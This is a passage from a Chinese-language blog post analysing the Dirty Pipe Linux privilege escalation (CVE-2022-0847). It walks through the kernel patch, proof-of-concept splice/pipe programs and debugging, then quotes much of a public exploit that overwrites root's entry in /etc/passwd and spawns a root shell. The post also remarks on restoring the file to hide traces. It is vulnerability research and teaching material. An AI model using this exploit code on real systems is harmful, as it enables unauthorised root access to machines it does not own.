<p>vmtouch is a tool for learning about and controlling the file system cache of unix and unix-like systems.</p>
</blockquote>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329165324080.png" alt="image-20220329165324080"></p>
<h4 id="3、一些注意点"><a href="#3、一些注意点" class="headerlink" title="3、一些注意点"></a>3、一些注意点</h4><p>由于缓存页面可以很容易地被驱逐和重用，一些操作系统，特别是<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_NT" >Windows NT<i class="fas fa-external-link-alt"></i></a>，甚至将页面缓存使用情况报告为“可用”内存，而内存实际上是分配给磁盘页面的。这导致了一些关于在 Windows 中使用页面缓存的混乱。</p>
<p>cache也容易产生测信道攻击，由于page cache与磁盘文件有pdflush措施，一般磁盘文件都有着严格的权限分离措施，所以page cache可能存在某些文件页面可以绕过权限分离并泄露有关其他进程的数据。这里的内容比较多，就不展开了。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="零、前言"><a href="#零、前言" class="headerlink" title="零、前言"></a>零、前言</h3><p>漏洞分析要养成一种由已知到未知的分析习惯，我们分析漏洞时，参考其他师傅的文章时，要想明白分析的具体思路是什么，具体的解决方法是什么。</p>
<p>实际上该漏洞归纳的分析思路大致为：补丁对比-&gt;漏洞验证-&gt;前置知识了解-&gt;漏洞调试-&gt;exp分析。这是一个不断探索的过程，每一步的操作都是为下一步做铺垫，补丁对比的意义在于简单了解漏洞点，漏洞验证帮助我们了解这个漏洞是长什么样子，他能造成什么后果（文件写入，代码注入，信息泄露等等）；前置知识了解帮助我们了解函数功能或者系统运作方式等等知识，为分析漏洞打好基础；漏洞调试帮助我们完全理解漏洞成因；exp分析帮助我们了解漏洞的利用方式。</p>
<p>我们按照这个顺序进行漏洞分析。</p>
<h3 id="一、补丁分析"><a href="#一、补丁分析" class="headerlink" title="一、补丁分析"></a>一、补丁分析</h3><p>漏洞补丁<a class="link"   target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/" >如下<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328160733330.png" alt="image-20220328160733330"></p>
<p>可见补丁对<code>buf-&gt;flags</code>进行了初始化，可以推断经过漏洞的影响，<code>buf-&gt;flags</code>必不为0！</p>
<p>目前我们不清楚<code>buf-&gt;flags</code>到底代表了什么含义。我们将带着这个问题进行源码分析。</p>
<h3 id="二、splice读写文件实验"><a href="#二、splice读写文件实验" class="headerlink" title="二、splice读写文件实验"></a>二、splice读写文件实验</h3><p>这里参考了漏洞发现者与ghost461师傅的文章，实验的内容为，编写两个程序，第一个程序对一个文件写入A，之后第二个程序调用splice函数将文件内容读取到管道，之后对管道写入B。发现执行完第一个程序时的文件内容全为A，而第二个程序执行后，文件内容里面竟然包含了B，明明第二个程序并没有写文件的操作。</p>
<p>下面的代码参考自ghost461的文章：</p>
<p>poc1</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* path = <span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(path,O_WRONLY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">write</span>(fd, <span class="string">&quot;AAAAA&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc2</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;title\n&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* path = <span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(path, O_RDONLY);</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(p)) <span class="built_in">abort</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = <span class="built_in">fcntl</span>(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line">    <span class="built_in">write</span>(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line">    <span class="built_in">read</span>(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nbytes = <span class="built_in">splice</span>(fd, <span class="number">0</span>, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], <span class="string">&quot;BBBBB&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行程序poc1</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328175234758.png" alt="image-20220328175234758"></p>
<p>执行程序poc2</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329142848335.png" alt="image-20220329142848335"></p>
<p>可见我们没有对文件进行写，但文件中仍然存在我们输入到管道中的BBBBB</p>
<p>重启后查看tmpfile文件</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328175234758.png" alt="image-20220328175234758"></p>
<p>重启后，B消失了，可见我们写入管道的BBBBB并没有真正的写入进文件中，而是写入了一块临时的内存空间中。</p>
<h3 id="三、动态分析"><a href="#三、动态分析" class="headerlink" title="三、动态分析"></a>三、动态分析</h3><p>我们在关键函数<code>pipe_wirte</code>与<code>copy_page_to_iter_pipe</code>下断点</p>
<p>由于在poc代码中先完成了一段填满管道再将管道清空的操作，在填满管道的过程中会触发<code>pipe_write</code>函数，且在某个else分支会将<code>buf-&gt;flags</code>赋值为<code>PIPE_BUF_FLAG_CAN_MERGE</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">is_packetized</span>(filp))				</span><br><span class="line">	buf-&gt;flags = PIPE_BUF_FLAG_PACKET;						<span class="comment">// PIPE_BUF_FLAG_PACKET == 0x8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;				<span class="comment">// PIPE_BUF_FLAG_CAN_MERGE == 0x10</span></span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151119554.png" alt="image-20220329151119554"></p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329150405704.png" alt="image-20220329150405704"></p>
<p>在经过多次命中<code>pipe_write</code>函数后，命中了<code>copy_page_to_iter_pipe</code>函数，在对<code>pipe buf</code>做初始化操作时并没有对<code>buf-&gt;flags</code>进行初始化，导致现在的<code>buf-&gt;flags</code>仍然是<code>0x10</code>，也就是<code>PIPE_BUF_FLAG_CAN_MERGE</code>。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329150704210.png" alt="image-20220329150704210"></p>
<p>在splice系统调用后面的系统调用即为write，文件描述符传的是pipe的文件描述符，此时跟进<code>pipe_write</code>，进入该if分支，此时chars代表的字符数表示write函数传入的第二个参数。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151436524.png" alt="image-20220329151436524"></p>
<p>poc中如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line">nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], data, data_size);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329151643307.png" alt="image-20220329151643307"></p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329152706101.png" alt="image-20220329152706101"></p>
<p>下面会判断<code>buf-&gt;flags</code>是否置位<code>PIPE_BUF_FLAG_CAN_MERGE</code>，如果是，则将文件内容<code>write</code>进管道。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220329153054612.png" alt="image-20220329153054612"></p>
<p>至此就是整体的漏洞流程。</p>
<h3 id="四、exp分析"><a href="#四、exp分析" class="headerlink" title="四、exp分析"></a>四、exp分析</h3><p>这里分析的是最先公开的<a class="link"   target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c" >exp代码<i class="fas fa-external-link-alt"></i></a>，我们尽量从已知来推断未知，代码用了大量的校验代码，在漏洞复现或利用时帮助我们精准的判断问题出在了哪里。</p>
<p>首先备份原始的passwd，因为我们的修改会使其内容发生变化。再完成提权后，我们可以选择将这个备份后的passwd.bak文件再还原回去，尽量不露痕迹，或者在测试时可以还原现场。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FILE *f1 = <span class="built_in">fopen</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">FILE *f2 = <span class="built_in">fopen</span>(<span class="string">&quot;/tmp/passwd.bak&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">while</span> ((c = <span class="built_in">fgetc</span>(f1)) != EOF)</span><br><span class="line">	<span class="built_in">fputc</span>(c, f2);</span><br><span class="line"><span class="built_in">fclose</span>(f1);</span><br><span class="line"><span class="built_in">fclose</span>(f2);</span><br></pre></td></tr></table></figure>

<p>之后创建管道，首先填满管道，这时<code>pipe_write</code>将<code>buf-&gt;flags</code>的<code>PIPE_BUF_FLAG_CAN_MERGE</code>位设置为1，之后清空管道，方便下一次poc的写入。此时该管道为空，且其缓冲区设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，下次操作管道描述符时不会创建新的page，而是仍然使用原有的page进行操作。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe</span>(p)) <span class="built_in">abort</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = <span class="built_in">fcntl</span>(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line"><span class="built_in">write</span>(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">leaving the flags initialized) */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) ? <span class="built_in"><span class="keyword">sizeof</span></span>(buffer) : r;</span><br><span class="line"><span class="built_in">read</span>(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">will be mergeable */</span></span><br></pre></td></tr></table></figure>

<p>之后触发漏洞。首先调用了<code>splice</code>将<code>file page</code>与<code>pipe buf</code>关联起来，之后<code>write</code>会调用<code>pipe_write</code>函数，判断<code>buf-&gt;flags</code>如果<code>PIPE_BUF_FLAG_CAN_MERGE</code>已置为，那么会直接操作<code>pipe buf</code>，也相当于操作了<code>file page</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">loff_t</span> offset = <span class="number">4</span>; <span class="comment">// after the &quot;root&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"><span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> fd = <span class="built_in">open</span>(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">--offset;</span><br><span class="line"><span class="keyword">ssize_t</span> nbytes = <span class="built_in">splice</span>(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">nbytes = <span class="built_in">write</span>(p[<span class="number">1</span>], data, data_size);</span><br></pre></td></tr></table></figure>

<p>此时可以当作root密码已经被修改，最终弹出shell</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;(echo aaron; cat) | su - -c \&quot;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;/bin/sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;\&quot; root&quot;</span>&#125;;</span><br><span class="line">        <span class="built_in">execv</span>(<span class="string">&quot;/bin/sh&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行的是下面的命令</span></span><br><span class="line"><span class="comment">// /bin/sh -c &quot;(echo aaron; cat) | su - -c \&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;cp /tmp/passwd.bak /etc/passwd;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;/bin/sh;\&quot; root&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>我们会发现如果了解前置知识后理解该漏洞竟是如此的简单，但是该漏洞的挖掘仍然是比较困难的，需要对splice和pipe等的这整块的内容熟悉，漏洞发现者也是在业务中发现了业务有些许异常才发现该漏洞。</p>
<p>该漏洞的利用也很有意思，首先是<code>buf-&gt;flags</code>没有初始化，从而找到了<code>pipe_write</code>函数对<code>PIPE_BUF_FLAG_CAN_MERGE</code>的操作，本来这样无关痛痒，只是可以随意覆写管道，但是由于page cache的存在，令我们随意覆写管道转换成随意覆写文件，后面想到可以覆写/etc/passwd，最终达到提权的目的，实际上该漏洞也可以覆写其他文件，提权只是该漏洞的一种表现形式。如<a class="link"   target="_blank" rel="noopener" href="https://haxx.in/files/dirtypipez.c" >该方法<i class="fas fa-external-link-alt"></i></a>就是利用了覆盖SUID文件</p>
<p>其他文章也提到过，由于调用<code>splice</code>函数需要对文件有读权限，如果没有读权限，那么该漏洞就无法利用了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a class="link"   target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/" >漏洞发现者的博客<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/4714867?fr=aladdin" >标准输入输出百度百科<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/269886" >360 Nitro师傅的分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009528245" >pipe原理<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/splice.2.html" >splice man手册<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://juejin.cn/post/6995519558475841550" >零拷贝的原理<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Direct_memory_access" >DMA维基百科<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaolincoding/p/13719610.html" >原来 8 张图，就可以搞懂「零拷贝」了<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/sendfile.2.html" >sendfile man手册<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1843/" >知道创宇ghost461师傅的分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://qinglinmao8315.github.io/linux/2018/03/14/linux-page-cache.html" >Linux Page Cache的理解<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Page_cache" >Page cache维基百科<i class="fas fa-external-link-alt"></i></a></li>
</ol>

        </div>

        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/linux/">#linux</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/04/14/domato101/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">domato101</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">sunlogin rce分析</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
